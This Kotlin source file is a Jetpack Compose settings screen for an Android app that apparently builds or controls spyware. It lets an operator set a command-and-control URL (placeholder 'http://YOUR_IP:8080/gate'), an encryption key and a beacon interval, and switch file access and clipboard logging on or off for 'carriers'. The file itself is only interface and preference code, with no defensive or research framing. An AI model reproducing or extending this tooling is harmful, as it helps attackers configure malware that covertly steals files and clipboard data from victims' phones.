package com.anonymousbeta.lakey.ui.screens

import android.content.Context
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.anonymousbeta.lakey.ui.theme.*
import com.anonymousbeta.lakey.utils.Prefs

@Composable
fun SettingsScreen() {
    val context = LocalContext.current
    val prefs = remember { Prefs(context) }

    var c2Url by remember { mutableStateOf(prefs.c2Url) }
    var encryptionKey by remember { mutableStateOf(prefs.encryptionKey) }
    var enableFileAccess by remember { mutableStateOf(prefs.enableFileAccess) }
    var enableClipboard by remember { mutableStateOf(prefs.enableClipboard) }
    var beaconInterval by remember { mutableStateOf(prefs.beaconInterval.toString()) }
    var status by remember { mutableStateOf("") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(BlackDeep)
            .verticalScroll(rememberScrollState())
            .padding(24.dp)
    ) {
        Text(
            text = "SETTINGS",
            color = Gold,
            fontSize = 28.sp,
            fontWeight = FontWeight.Bold
        )
        Spacer(modifier = Modifier.height(8.dp))
        Text(
            text = "Changes apply instantly – no rebuild needed",
            color = TextSecondary,
            fontSize = 13.sp
        )

        Spacer(modifier = Modifier.height(32.dp))

        // C2 URL
        Text("C2 URL", color = TextPrimary, fontSize = 14.sp, fontWeight = FontWeight.Medium)
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = c2Url,
            onValueChange = { c2Url = it },
            modifier = Modifier.fillMaxWidth(),
            singleLine = true,
            colors = textFieldColors(),
            shape = RoundedCornerShape(12.dp),
            placeholder = { Text("http://YOUR_IP:8080/gate", color = TextSecondary) }
        )

        Spacer(modifier = Modifier.height(20.dp))

        // Encryption Key
        Text("Encryption Key (32 chars)", color = TextPrimary, fontSize = 14.sp, fontWeight = FontWeight.Medium)
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = encryptionKey,
            onValueChange = { encryptionKey = it },
            modifier = Modifier.fillMaxWidth(),
            singleLine = true,
            colors = textFieldColors(),
            shape = RoundedCornerShape(12.dp)
        )

        Spacer(modifier = Modifier.height(20.dp))

        // Beacon Interval
        Text("Beacon Interval (seconds)", color = TextPrimary, fontSize = 14.sp, fontWeight = FontWeight.Medium)
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = beaconInterval,
            onValueChange = { beaconInterval = it.filter { c -> c.isDigit() } },
            modifier = Modifier.fillMaxWidth(),
            singleLine = true,
            colors = textFieldColors(),
            shape = RoundedCornerShape(12.dp)
        )

        Spacer(modifier = Modifier.height(28.dp))

        // Toggles
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text("File Access", color = TextPrimary, fontSize = 15.sp)
            Switch(
                checked = enableFileAccess,
                onCheckedChange = { enableFileAccess = it },
                colors = SwitchDefaults.colors(
                    checkedThumbColor = Gold,
                    checkedTrackColor = Gold.copy(alpha = 0.5f),
                    uncheckedThumbColor = TextSecondary,
                    uncheckedTrackColor = BlackSoft
                )
            )
        }

        Spacer(modifier = Modifier.height(12.dp))

        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text("Clipboard Logging", color = TextPrimary, fontSize = 15.sp)
            Switch(
                checked = enableClipboard,
                onCheckedChange = { enableClipboard = it },
                colors = SwitchDefaults.colors(
                    checkedThumbColor = Gold,
                    checkedTrackColor = Gold.copy(alpha = 0.5f),
                    uncheckedThumbColor = TextSecondary,
                    uncheckedTrackColor = BlackSoft
                )
            )
        }

        Spacer(modifier = Modifier.height(40.dp))

        Button(
            onClick = {
                prefs.c2Url = c2Url.trim()
                prefs.encryptionKey = encryptionKey.trim()
                prefs.enableFileAccess = enableFileAccess
                prefs.enableClipboard = enableClipboard
                prefs.beaconInterval = beaconInterval.toIntOrNull() ?: 30
                status = "Saved – new carriers will use these settings"
            },
            modifier = Modifier
                .fillMaxWidth()
                .height(52.dp),
            colors = ButtonDefaults.buttonColors(
                containerColor = Gold,
                contentColor = BlackDeep
            ),
            shape = RoundedCornerShape(12.dp)
        ) {
            Text("Save Settings", fontWeight = FontWeight.SemiBold)
        }

        if (status.isNotEmpty()) {
            Spacer(modifier = Modifier.height(16.dp))
            Text(status, color = Gold, fontSize = 13.sp)
        }
    }
}

@Composable
private fun textFieldColors() = OutlinedTextFieldDefaults.colors(
    focusedBorderColor = Gold,
    unfocusedBorderColor = BlackSoft,
    focusedTextColor = TextPrimary,
    unfocusedTextColor = TextPrimary,
    cursorColor = Gold,
    focusedContainerColor = BlackCard,
    unfocusedContainerColor = BlackCard
)